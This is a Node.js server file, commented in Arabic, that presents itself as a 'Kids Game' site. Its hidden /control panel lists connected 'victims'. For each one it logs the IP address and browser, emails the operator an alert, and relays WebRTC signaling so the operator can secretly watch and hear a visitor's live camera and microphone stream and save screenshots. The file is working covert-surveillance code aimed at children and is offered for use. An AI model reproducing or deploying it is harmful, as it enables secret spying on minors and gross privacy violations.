// server.js — قم بتشغيله بدلاً من PHP
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const nodemailer = require('nodemailer');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const PORT = 8080;

// ⚙️ إعدادات الإيميل — عدلها حسب بريدك (Gmail مع App Password)
const EMAIL_CONFIG = {
  from: 'your-email@gmail.com',
  to: 'your-email@gmail.com',     // بريدك اللي تبغى تجي فيه الإشعارات
  subject: '🚨 NEW VICTIM CONNECTED - Kids Game',
  smtp: {
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
      user: 'your-email@gmail.com',
      pass: 'your-app-password'   // استخدم App Password (ليس كلمة المرور العادية)
    }
  }
};

const transporter = nodemailer.createTransport(EMAIL_CONFIG.smtp);

// تخزين الجلسات النشطة
const activeSessions = new Map();
let sessionCounter = 0;

// ========== Serve Static Files ==========
app.use(express.static(path.join(__dirname, 'public')));

// صفحة الألعاب
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== Control Panel ==========
app.get('/control', (req, res) => {
  res.send(`
<html>
<head>
  <title>🎮 Control Panel - Kids Game</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #0f0f1a;
      color: white;
      padding: 20px;
    }
    h1 { 
      text-align: center;
      margin-bottom: 30px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      font-size: 36px;
    }
    .stats {
      text-align: center;
      margin-bottom: 25px;
      font-size: 18px;
    }
    .stats span { 
      background: rgba(255,255,255,0.1);
      padding: 8px 20px;
      border-radius: 20px;
      margin: 0 5px;
    }
    .sessions {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
      gap: 20px;
      max-width: 1400px;
      margin: 0 auto;
    }
    .session-card {
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 16px;
      padding: 20px;
      backdrop-filter: blur(10px);
    }
    .session-card h3 {
      color: #667eea;
      margin-bottom: 10px;
    }
    .session-card .info {
      font-size: 13px;
      color: #aaa;
      margin-bottom: 15px;
    }
    .session-card video {
      width: 100%;
      border-radius: 10px;
      background: #000;
    }
    .session-card .controls {
      margin-top: 12px;
      display: flex;
      gap: 10px;
    }
    .session-card button {
      flex: 1;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .btn-audio { background: #6bcb77; color: #000; }
    .btn-stop { background: #ff6b6b; color: white; }
    .btn-snap { background: #4d96ff; color: white; }
    .session-card button:active { transform: scale(0.95); }
    .no-sessions {
      text-align: center;
      grid-column: 1 / -1;
      padding: 60px;
      color: #666;
      font-size: 20px;
    }
    .status-dot {
      display: inline-block;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 8px;
    }
    .status-dot.online { background: #6bcb77; box-shadow: 0 0 10px #6bcb77; }
    .status-dot.offline { background: #ff6b6b; }
    .logs {
      max-width: 800px;
      margin: 30px auto;
      background: rgba(0,0,0,0.3);
      border-radius: 12px;
      padding: 20px;
      max-height: 200px;
      overflow-y: auto;
    }
    .logs h3 { margin-bottom: 10px; color: #666; }
    .logs .log-entry { font-size: 12px; color: #888; padding: 3px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
    .refresh-btn {
      display: block;
      margin: 20px auto;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      border: none;
      padding: 12px 40px;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>🎮 Control Panel</h1>
  <div class="stats">
    <span>🟢 <span id="sessionCount">0</span> active sessions</span>
    <span>📸 <span id="totalSnaps">0</span> snapshots</span>
  </div>
  <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
  <div class="sessions" id="sessionList"></div>
  <div class="logs" id="logs">
    <h3>📋 Live Logs</h3>
  </div>
  
  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sessionList = document.getElementById('sessionList');
    const sessionCount = document.getElementById('sessionCount');
    const logsDiv = document.getElementById('logs');

    function addLog(msg) {
      const entry = document.createElement('div');
      entry.className = 'log-entry';
      entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
      logsDiv.appendChild(entry);
      logsDiv.scrollTop = logsDiv.scrollHeight;
    }

    const peerConnections = {};
    const remoteStreams = {};
    const sessionListeners = {}; // track listeners per session to remove them

    socket.on('connect', function() {
      addLog('✅ Connected to signaling server');
    });

    function cleanupSession(sid) {
      // Close peer connection
      if (peerConnections[sid]) {
        try { peerConnections[sid].close(); } catch(e) {}
        delete peerConnections[sid];
      }
      delete remoteStreams[sid];
      // Remove socket listeners for this session
      if (sessionListeners[sid]) {
        sessionListeners[sid].forEach(function(item) {
          socket.off(item.event, item.fn);
        });
        delete sessionListeners[sid];
      }
    }

    function connectToSession(sid, card, v) {
      // Clean up any existing connection first
      cleanupSession(sid);

      const iceConfig = { 
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' },
          { urls: 'stun:stun2.l.google.com:19302' },
          { urls: 'stun:global.stun.twilio.com:3478' }
        ]
      };

      const pc = new RTCPeerConnection(iceConfig);
      peerConnections[sid] = pc;
      sessionListeners[sid] = [];

      let hasRemoteDesc = false;
      let iceQueue = [];

      pc.ontrack = function(event) {
        if (event.streams && event.streams[0]) {
          v.srcObject = event.streams[0];
          remoteStreams[sid] = event.streams[0];
        } else {
          if (!v.srcObject) {
            v.srcObject = new MediaStream();
          }
          v.srcObject.addTrack(event.track);
          remoteStreams[sid] = v.srcObject;
        }
        addLog('📡 Track (' + event.track.kind + ') from ' + sid);
      };

      pc.onicecandidate = function(event) {
        if (event.candidate) {
          socket.emit('ctrl-ice', { target: sid, candidate: event.candidate });
        }
      };

      pc.oniceconnectionstatechange = function() {
        addLog('⚡ ICE ' + sid + ': ' + pc.iceConnectionState);
        if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
          addLog('🟢 LIVE! Stream active from ' + sid);
          var dot = card.querySelector('.status-dot');
          if (dot) { dot.className = 'status-dot online'; }
        }
        if (pc.iceConnectionState === 'failed') {
          addLog('🔴 ICE failed for ' + sid + ' - retrying...');
          setTimeout(function() { connectToSession(sid, card, v); }, 2000);
        }
      };

      // Register offer listener
      var offerFn = function(offer) {
        addLog('📥 Offer from ' + sid);
        pc.setRemoteDescription(new RTCSessionDescription(offer))
          .then(function() {
            hasRemoteDesc = true;
            // Flush queued ICE candidates
            iceQueue.forEach(function(c) {
              pc.addIceCandidate(new RTCIceCandidate(c)).catch(function(e) { addLog('❌ ICE: ' + e.message); });
            });
            iceQueue = [];
            return pc.createAnswer();
          })
          .then(function(answer) { return pc.setLocalDescription(answer); })
          .then(function() {
            socket.emit('ctrl-answer', { target: sid, answer: pc.localDescription });
            addLog('📤 Answer sent to ' + sid);
          })
          .catch(function(e) { addLog('❌ Error: ' + e.message); });
      };
      socket.on('victim-offer-' + sid, offerFn);
      sessionListeners[sid].push({ event: 'victim-offer-' + sid, fn: offerFn });

      // Register ICE candidate listener
      var iceFn = function(candidate) {
        if (hasRemoteDesc) {
          pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(function(e) { addLog('❌ ICE: ' + e.message); });
        } else {
          iceQueue.push(candidate);
        }
      };
      socket.on('victim-ice-' + sid, iceFn);
      sessionListeners[sid].push({ event: 'victim-ice-' + sid, fn: iceFn });

      // Request stream
      socket.emit('request-stream', { target: sid });
      addLog('📨 Requested stream from ' + sid);
    }

    socket.on('session-list', function(sessions) {
      sessionCount.textContent = sessions.length;

      if (sessions.length === 0 && sessionList.children.length === 0) {
        sessionList.innerHTML = '<div class="no-sessions" id="noSessionsMsg">🔴 Waiting for victims to connect...</div>';
        return;
      } else if (sessions.length > 0) {
        var noSess = document.getElementById('noSessionsMsg');
        if (noSess) noSess.remove();
      }

      // Remove cards for disconnected sessions
      Array.from(sessionList.children).forEach(function(child) {
        if (child.id && child.id.startsWith('card-')) {
          var sid = child.id.replace('card-', '');
          if (!sessions.includes(sid)) {
            child.remove();
            cleanupSession(sid);
          }
        }
      });

      // Add new sessions (skip existing)
      sessions.forEach(function(sid) {
        if (document.getElementById('card-' + sid)) return;

        var card = document.createElement('div');
        card.className = 'session-card';
        card.id = 'card-' + sid;

        var v = document.createElement('video');
        v.id = 'video-' + sid;
        v.autoplay = true;
        v.playsinline = true;
        v.style.width = '100%';
        v.style.borderRadius = '10px';
        v.muted = true;

        var info = document.createElement('div');
        info.className = 'info';
        info.innerHTML = '<span class="status-dot online"></span> Session: <strong>' + sid + '</strong>';

        var controlsDiv = document.createElement('div');
        controlsDiv.className = 'controls';
        
        var btnAudio = document.createElement('button');
        btnAudio.className = 'btn-audio';
        btnAudio.textContent = '🔊 Unmute Audio';
        btnAudio.onclick = function() {
          v.muted = !v.muted;
          btnAudio.textContent = v.muted ? '🔊 Unmute Audio' : '🔇 Mute Audio';
        };

        var btnSnap = document.createElement('button');
        btnSnap.className = 'btn-snap';
        btnSnap.textContent = '📸 Screenshot';
        btnSnap.onclick = function() {
          var canvas = document.createElement('canvas');
          canvas.width = v.videoWidth || 640;
          canvas.height = v.videoHeight || 480;
          canvas.getContext('2d').drawImage(v, 0, 0);
          var link = document.createElement('a');
          link.download = 'snap_' + sid + '_' + Date.now() + '.png';
          link.href = canvas.toDataURL();
          link.click();
        };

        controlsDiv.appendChild(btnAudio);
        controlsDiv.appendChild(btnSnap);

        card.appendChild(info);
        card.appendChild(v);
        card.appendChild(controlsDiv);
        sessionList.appendChild(card);

        // Connect WebRTC
        connectToSession(sid, card, v);
      });
    });

    socket.on('new-session', function(sid) {
      addLog('🆕 New victim: ' + sid);
      socket.emit('get-sessions');
    });

    socket.on('session-gone', function(sid) {
      addLog('🔴 Session ended: ' + sid);
      var card = document.getElementById('card-' + sid);
      if (card && card.parentNode) card.remove();
      cleanupSession(sid);
    });

    // Poll sessions every 10 seconds (not 5)
    setInterval(function() { socket.emit('get-sessions'); }, 10000);
    socket.emit('get-sessions');
  </script>
</body>
</html>
  `);
});

// ========== Socket.IO Signaling ==========
io.on('connection', (socket) => {
  const clientIP = socket.handshake.address;
  const sessionId = 'SESS-' + (++sessionCounter).toString(16).toUpperCase() + '-' + Date.now().toString(36);

  console.log(`[+] New connection: ${sessionId} from ${clientIP}`);

  // Control Panel requests active sessions list
  socket.on('get-sessions', () => {
    socket.isControl = true;
    const activeList = Array.from(activeSessions.keys());
    socket.emit('session-list', activeList);
  });

  // Victim registers itself
  socket.on('offer', (offer) => {
    socket.sessionId = sessionId;
    socket.isVictim = true;
    activeSessions.set(sessionId, { socket, ip: clientIP, connectedAt: Date.now() });

    // Send email alert
    const mailBody = `
🚨 NEW VICTIM CONNECTED 🚨

Session ID: ${sessionId}
IP Address: ${clientIP}
Time: ${new Date().toLocaleString()}
User-Agent: ${socket.handshake.headers['user-agent'] || 'N/A'}

Open Control Panel: http://localhost:${PORT}/control
    `;

    transporter.sendMail({
      from: EMAIL_CONFIG.from,
      to: EMAIL_CONFIG.to,
      subject: EMAIL_CONFIG.subject + ' - ' + sessionId,
      text: mailBody
    }).then(() => {
      console.log(`[EMAIL] Alert sent for ${sessionId}`);
    }).catch(err => {
      console.log(`[EMAIL] Failed to send: ${err.message}`);
    });

    // Notify all Control Panels
    io.emit('new-session', sessionId);
    console.log(`[SIGNAL] Victim registered: ${sessionId}`);
  });

  // CP requests stream from a victim
  socket.on('request-stream', (data) => {
    const victim = activeSessions.get(data.target);
    if (victim) {
      console.log(`[SIGNAL] CP ${socket.id} requesting stream from ${data.target}`);
      victim.socket.emit('request-stream', { cpId: socket.id });
    } else {
      console.log(`[SIGNAL] Victim ${data.target} not found for stream request`);
    }
  });

  // Victim sends WebRTC offer (to be relayed to CP)
  socket.on('video-offer', (data) => {
    console.log(`[SIGNAL] Victim ${socket.sessionId} sends offer to CP ${data.cpId}`);
    io.to(data.cpId).emit('victim-offer-' + socket.sessionId, data.offer);
  });

  // CP sends WebRTC answer (to be relayed to Victim)
  socket.on('ctrl-answer', (data) => {
    const victim = activeSessions.get(data.target);
    if (victim) {
      console.log(`[SIGNAL] CP ${socket.id} sends answer to victim ${data.target}`);
      victim.socket.emit('video-answer', { cpId: socket.id, answer: data.answer });
    }
  });

  // ICE from Victim → CP
  socket.on('ice-candidate', (data) => {
    if (data.cpId && socket.sessionId) {
      io.to(data.cpId).emit('victim-ice-' + socket.sessionId, data.candidate);
    }
  });

  // ICE from CP → Victim
  socket.on('ctrl-ice', (data) => {
    if (data.target) {
      const victim = activeSessions.get(data.target);
      if (victim) {
        victim.socket.emit('ice-candidate', { cpId: socket.id, candidate: data.candidate });
      }
    }
  });

  socket.on('disconnect', () => {
    if (socket.sessionId) {
      activeSessions.delete(socket.sessionId);
      io.emit('session-gone', socket.sessionId);
      console.log(`[-] Session ended: ${socket.sessionId}`);
    }
  });
});

// ========== Start Server ==========
server.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════╗
║    🎮 Kids Game Server Running           ║
╠══════════════════════════════════════════╣
║  Game Page:  http://localhost:${PORT}      ║
║  Control:    http://localhost:${PORT}/control ║
║  Port:       ${PORT}                       ║
║  Email Alerts: ${EMAIL_CONFIG.smtp.auth.user ? '✅ Active' : '❌ Not configured'}  ║
╚══════════════════════════════════════════╝
  `);
});